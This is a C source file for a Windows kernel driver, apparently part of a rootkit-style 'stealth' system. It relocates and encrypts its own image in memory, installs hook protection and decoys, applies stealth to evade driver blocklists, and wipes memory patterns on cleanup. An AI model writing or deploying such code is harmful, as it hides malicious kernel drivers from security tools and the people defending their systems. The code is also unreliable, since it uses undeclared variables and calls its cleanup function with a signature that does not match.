#include "stealth_types.h"
#include "stealth_core.h"
#include "memory_protection.h"
#include "anti_debug.h"
#include "hook_protection.h"

static NTSTATUS InitializeEncryption(PSTEALTH_CONTEXT Context) {
    UCHAR key[32];
    NTSTATUS status = BCryptGenRandom(NULL, key, sizeof(key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (!NT_SUCCESS(status)) return status;

    Context->EncryptionKey = ExAllocatePoolWithTag(NonPagedPool, sizeof(key), 'pyrC');
    if (!Context->EncryptionKey) return STATUS_INSUFFICIENT_RESOURCES;

    RtlCopyMemory(Context->EncryptionKey, key, sizeof(key));
    return STATUS_SUCCESS;
}

static NTSTATUS RelocateDriverImage(PSTEALTH_CONTEXT Context, PDRIVER_OBJECT DriverObject) {
    // Allocate new memory region with random offset
    SIZE_T allocation_size = Context->ImageSize + PAGE_SIZE * (RtlRandomEx(&seed) % 64);
    PVOID new_base = ExAllocatePoolWithTag(NonPagedPool, allocation_size, 'colR');
    if (!new_base) return STATUS_INSUFFICIENT_RESOURCES;

    // Copy and relocate image
    RtlCopyMemory(new_base, Context->OriginalBase, Context->ImageSize);
    
    // Perform relocations
    PIMAGE_NT_HEADERS nt_headers = RtlImageNtHeader(new_base);
    if (nt_headers) {
        status = RelocateImage(new_base, 
                             (ULONG_PTR)new_base - (ULONG_PTR)Context->OriginalBase,
                             nt_headers);
        if (!NT_SUCCESS(status)) {
            ExFreePoolWithTag(new_base, 'colR');
            return status;
        }
    }

    Context->RelocatedBase = new_base;
    return STATUS_SUCCESS;
}

NTSTATUS InitializeStealthSystem(PDRIVER_OBJECT DriverObject, ULONG Flags, PSTEALTH_CONTEXT* OutContext) {
    PSTEALTH_CONTEXT context = ExAllocatePoolWithTag(NonPagedPool, sizeof(STEALTH_CONTEXT), 'htlS');
    if (!context) return STATUS_INSUFFICIENT_RESOURCES;

    RtlZeroMemory(context, sizeof(STEALTH_CONTEXT));
    
    // Store original image information
    context->OriginalBase = DriverObject->DriverStart;
    context->ImageSize = DriverObject->DriverSize;

    // Initialize protection lock
    KeInitializeSpinLock(&context->ProtectionLock);

    if (Flags & STEALTH_INIT_RELOCATE) {
        status = RelocateDriverImage(context, DriverObject);
        if (!NT_SUCCESS(status)) goto cleanup;
    }

    if (Flags & STEALTH_INIT_ENCRYPT) {
        status = InitializeEncryption(context);
        if (!NT_SUCCESS(status)) goto cleanup;
        
        // Encrypt relocated image
        if (context->RelocatedBase) {
            status = EncryptMemoryRegion(context->RelocatedBase, 
                                       context->ImageSize,
                                       context->EncryptionKey);
            if (!NT_SUCCESS(status)) goto cleanup;
        }
    }

    if (Flags & STEALTH_INIT_HOOK) {
        status = InitializeHookProtection(context);
        if (!NT_SUCCESS(status)) goto cleanup;
    }

    if (Flags & STEALTH_INIT_DECOY) {
        status = InitializeDecoys(context);
        if (!NT_SUCCESS(status)) goto cleanup;
    }

    // Initialize driver stealth
    status = InitializeDriverStealth(context);
    if (!NT_SUCCESS(status)) goto cleanup;

    // Check for blocked drivers and apply stealth
    UNICODE_STRING driverName;
    RtlInitUnicodeString(&driverName, L"Your_Driver_Name");
    status = ApplyDriverStealth(context->OriginalBase, &driverName);
    if (!NT_SUCCESS(status)) goto cleanup;

    *OutContext = context;
    return STATUS_SUCCESS;

cleanup:
    CleanupStealthSystem(context, TRUE);
    return status;
}

void CleanupStealthSystem(PDRIVER_OBJECT DriverObject) {
    // Cleanup in reverse order
    CleanupMemoryProtection();
    RandomizeMemoryPatterns(); // Final confusion
    
    if (DriverObject->DriverStart) {
        RtlSecureZeroMemory(DriverObject->DriverStart, DriverObject->DriverSize);
    }
} 